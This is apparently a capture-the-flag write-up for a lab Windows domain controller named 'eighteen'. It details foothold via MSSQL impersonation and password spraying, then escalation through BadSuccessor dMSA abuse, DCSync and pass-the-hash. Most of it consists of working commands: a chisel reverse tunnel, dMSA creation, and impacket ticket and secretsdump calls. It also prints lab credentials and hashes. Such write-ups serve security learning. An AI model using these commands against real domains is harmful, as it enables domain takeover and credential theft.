---
title: "eighteen"
date: 2026-02-27
draft: false
tags: ["windows", "active-directory", "mssql", "web"]
categories: ["writeups"]
summary: ""
params:
  box:
    os: "Windows Server 2025 Build 26100 (DC01.eighteen.htb)"
    difficulty: ""
ShowToc: true
---

## Reconnaissance

### Nmap
- **80/tcp** — IIS 10.0 hosting Flask/Werkzeug financial planning app
- **1433/tcp** — MSSQL 2022 RTM (Microsoft SQL Server 2022)
- **5985/tcp** — WinRM
- **53/udp** — DNS (found via UDP scan)
- **Filtered externally:** 88 (Kerberos), 135 (RPC), 389 (LDAP), 445 (SMB)
- Domain: `eighteen.htb`, hostname: `DC01` (Domain Controller)

### Web App (`http://eighteen.htb/`)
- Flask/Werkzeug financial planning app on IIS
- Routes: `/login`, `/register`, `/dashboard`, `/admin`, `/add_expense`, `/update_income`, `/update_allocation`, `/delete_expense`
- Backend uses raw SQL via ODBC Driver 17 (parameterized queries — not injectable)
- Registration error leaks raw SQL errors in Flask session cookies
- App source at `C:\inetpub\eighteen.htb\app.py`

### Domain Users (from RID brute via `nxc mssql --rid-brute`)
Administrator, mssqlsvc, jamie.dunn, jane.smith, alice.jones, adam.scott, bob.brown, carol.white, dave.green, kevin

### AD Structure
- **OU=Staff** contains: all domain users (except Administrator, kevin, mssqlsvc) + groups (HR, IT, Finance)
- **IT group members:** adam.scott, bob.brown
- **Domain Admins:** Administrator only

## Foothold
1. Given creds: `kevin / iNa2we6haRj2gaw!` → MSSQL access (guest on master, Windows auth)
2. kevin can impersonate `appdev` in MSSQL → access `financial_planner` DB
3. Dumped `users` table → admin hash `pbkdf2:sha256:600000$AMtzteQIG7yAbZIa$...` (Werkzeug PBKDF2)
4. Cracked admin hash (hashcat -m 10900) → `iloveyou1`
5. RID brute via `nxc mssql $TARGET -u kevin -p 'iNa2we6haRj2gaw!' -M mssql_priv --rid-brute` → enumerated domain users
6. Password spray → `adam.scott:iloveyou1` on WinRM (Pwn3d!)
7. adam.scott is in **IT** group + Remote Management Users

### MSSQL Details
- Only two SQL logins: `sa` and `appdev` (kevin uses Windows auth)
- kevin can impersonate appdev (EXECUTE AS LOGIN)
- appdev is NOT db_owner of financial_planner (despite having access)
- appdev is NOT sysadmin
- xp_cmdshell disabled and not grantable to appdev
- MSSQL service runs as `EIGHTEEN\mssqlsvc`
- Captured mssqlsvc NTLMv2 hash via xp_dirtree UNC path + Responder — did NOT crack with rockyou

### Web App Config (`C:\inetpub\eighteen.htb\app.py`)
```python
DB_CONFIG = {
    'server': 'dc01.eighteen.htb',
    'database': 'financial_planner',
    'username': 'appdev',
    'password': 'MissThisElite$90',
    'driver': '{ODBC Driver 17 for SQL Server}',
}
```

## Privilege Escalation

### Enumeration Summary (what was checked and ruled out)
- **LAPS:** Not installed (legacy or Windows LAPS)
- **ADCS:** No Certificate Authority found
- **gMSA:** None
- **GPP passwords:** None in SYSVOL
- **Kerberoastable accounts:** Only krbtgt
- **Constrained delegation:** None configured on users or computers
- **Unconstrained delegation:** Only DC01 (normal for DC)
- **DnsAdmins group:** Empty
- **IT group ACLs on users/groups:** None
- **IT group ACLs on domain object:** None
- **IT group ACLs on DC01 computer:** None
- **AutoLogon/stored creds:** None
- **AlwaysInstallElevated:** Not available
- **Modifiable services:** None
- **PowerShell history:** Empty
- **IIS app directory writable:** No (Users = RX only)
- **MSSQL db_owner escalation:** appdev is NOT db_owner, TRUSTWORTHY is off

### Key Finding: IT group has CreateChild on Staff OU
```
IdentityReference: EIGHTEEN\IT
ActiveDirectoryRights: CreateChild
ObjectType: 00000000-0000-0000-0000-000000000000 (ALL object types)
OU: OU=Staff,DC=eighteen,DC=htb
IsInherited: False  ← intentionally set!
```

### Key Finding: Domain password policy
`DOMAIN_PASSWORD_STORE_CLEARTEXT` is enabled (reversible encryption)

### BloodHound Path (IT → Domain Admins)
```
IT → CanPSRemote → DC01 → HasSession → Administrator → MemberOf → Domain Admins
```
Administrator has an active session on DC01. Need local admin/SYSTEM to dump credentials.

### Attack: BadSuccessor (dMSA abuse — CVE-2025-53779)
**The privesc:** IT has CreateChild on Staff OU → create a delegated Managed Service Account (dMSA) with Administrator as predecessor → dMSA inherits Administrator's Kerberos privileges → DCSync → pass-the-hash.

**Step 1: Set up chisel SOCKS tunnel**
DC ports (88, 135, 389, 445) are filtered externally. Chisel creates a SOCKS proxy through the WinRM session:
```
# Kali:
chisel server --reverse -p 9001
# DC01 (evil-winrm):
.\chisel.exe client <VPN_IP>:9001 R:socks
```
Update `/etc/proxychains4.conf`: `socks5 127.0.0.1 1080`

**Step 2: Create computer account (needed for dMSA authentication)**
Invoke-BadSuccessor.ps1 creates `Pwn$` (password: `Password123!`) in Staff OU. However, its dMSA creation step silently fails (no error handling) — the dMSA never gets created despite printing keys.

**Step 3: Create dMSA manually with attributes set at creation time**
CreateChild only grants creation rights, not modification. Must set predecessor and state in the same LDAP Add operation:
```powershell
New-ADServiceAccount -Name "evilDMSA2" -DNSHostName "evilDMSA2.eighteen.htb" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword "Pwn$" -Path "OU=Staff,DC=eighteen,DC=htb" -KerberosEncryptionType AES256 -OtherAttributes @{"msDS-DelegatedMSAState"=2;"msDS-ManagedAccountPrecededByLink"="CN=Administrator,CN=Users,DC=eighteen,DC=htb"} -PassThru
```

**Step 4: Get dMSA keys from Kali via impacket (through SOCKS)**
Compute AES key for Pwn$ and use impacket-getST with dMSA flow:
```bash
# Compute Pwn$ AES256 key (salt: EIGHTEEN.HTBhostpwn.eighteen.htb)
python3 -c "from impacket.krb5.crypto import string_to_key; from impacket.krb5.constants import EncryptionTypes; key = string_to_key(EncryptionTypes.aes256_cts_hmac_sha1_96.value, b'Password123!', b'EIGHTEEN.HTBhostpwn.eighteen.htb'); print(key.contents.hex().upper())"
# → 07CE45274C9D70F6C47ACD9D72838A4D292903CBC8947E2C32B7F9E0ECF17D0B

# Get TGT for Pwn$
proxychains -q impacket-getTGT -aesKey 07CE45274C9D70F6C47ACD9D72838A4D292903CBC8947E2C32B7F9E0ECF17D0B -dc-ip <TARGET> 'eighteen.htb/Pwn$'

# Get dMSA ticket + extract keys (S4U2Self with dMSA flag)
KRB5CCNAME=Pwn\$.ccache proxychains -q impacket-getST -k -no-pass -impersonate 'evilDMSA2$' -self -dmsa -dc-ip <TARGET> 'eighteen.htb/Pwn$'
```
Output includes dMSA keys (inherited from Administrator) and saves a krbtgt ccache ticket.

**Step 5: DCSync with dMSA ticket**
```bash
KRB5CCNAME='evilDMSA2$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache' proxychains -q impacket-secretsdump -k -no-pass -just-dc-user Administrator 'eighteen.htb/evilDMSA2$@dc01.eighteen.htb' -dc-ip <TARGET>
```
Result: `Administrator:500:aad3b435b51404eeaad3b435b51404ee:0b133be956bfaddf9cea56701affddec`

**Step 6: Pass-the-hash**
```
evil-winrm -i <TARGET> -u Administrator -H 0b133be956bfaddf9cea56701affddec
```

### Problems Encountered and Solved

**Invoke-BadSuccessor.ps1 silently fails on dMSA creation:** The script's `New-ADServiceAccount -CreateDelegatedServiceAccount` call has no try/catch. When it fails (permissions, schema issues), `$service` is null and the script continues printing placeholder output with empty values. Always verify: `Get-ADObject -LDAPFilter "(objectClass=msDS-DelegatedManagedServiceAccount)"`

**CreateChild ≠ WriteProperty:** After creating a dMSA, the creator cannot modify its attributes (no GenericAll/WriteProperty). Even the DACL can't be modified (owner defaults to Domain Admins on Server 2025). Solution: set all attributes at creation time using `-OtherAttributes` parameter.

**Rubeus v2.3.3 NullReferenceException on dMSA:** Rubeus asktgs with /dmsa flag gets "TGS request successful!" but crashes with NullReferenceException in response parsing. The /outfile flag doesn't save before the crash. Solution: use impacket-getST with `-impersonate -self -dmsa` instead.

**Kerberos clock skew through tunnel:** Use `-debug` on impacket tools to see DC's actual UTC time. Set local clock: `sudo date -s "YYYY-MM-DD HH:MM:SS"` (set local time so UTC matches DC).

**LDAP signing blocks impacket through SOCKS:** `badsuccessor.py` and LDAP tools can't negotiate SASL signing through the SOCKS proxy. Do AD object creation in evil-winrm, use impacket only for Kerberos operations.

## Flags
- **User:** [redacted]
- **Root:** [redacted]

## Lessons Learned
- **Read the box instructions first** — missed provided credentials (kevin) and wasted time on web app enumeration
- **SharpHound/BloodHound early** — would have shown the IT→DC01→Admin path immediately instead of hours of manual AD enumeration
- **BadSuccessor (CVE-2025-53779)** — any user with CreateChild on any OU can create a dMSA pointing at any account, inheriting all its privileges. Works on Windows Server 2025 with default settings.
- **KrbRelayUp doesn't work on Server 2025** — COM coercion fails with "Bad path to object"
- **Evil-winrm limitation** — network logon sessions can't persist Kerberos tickets injected via Rubeus /ptt. Need chisel/tunnel for impacket tools.
- **Filtered ports ≠ closed ports** — DC01 has all standard DC ports open locally, just filtered by host firewall externally. Tunneling bypasses this.
- **winPEAS output to file** — always redirect winPEAS output to a file for review: `.\winPEASx64.exe | Out-File -Encoding ascii winpeas.txt`
- **Invoke-BadSuccessor.ps1 is unreliable** — silently fails on dMSA creation with no error handling. Verify objects exist before proceeding. Manual `New-ADServiceAccount -CreateDelegatedServiceAccount -OtherAttributes` is more reliable.
- **CreateChild only grants creation, not modification** — set all critical attributes (msDS-DelegatedMSAState, msDS-ManagedAccountPrecededByLink) at creation time via `-OtherAttributes` in a single LDAP Add operation.
- **Rubeus v2.3.3 dMSA is broken** — use impacket-getST with `-impersonate <dMSA$> -self -dmsa` from Kali instead. Requires chisel SOCKS tunnel.
- **impacket-getST dMSA flow** — authenticates as computer account, S4U2Self for dMSA, extracts KERB_DMSA_KEY_PACKAGE with predecessor's keys, saves krbtgt ccache usable for DCSync.
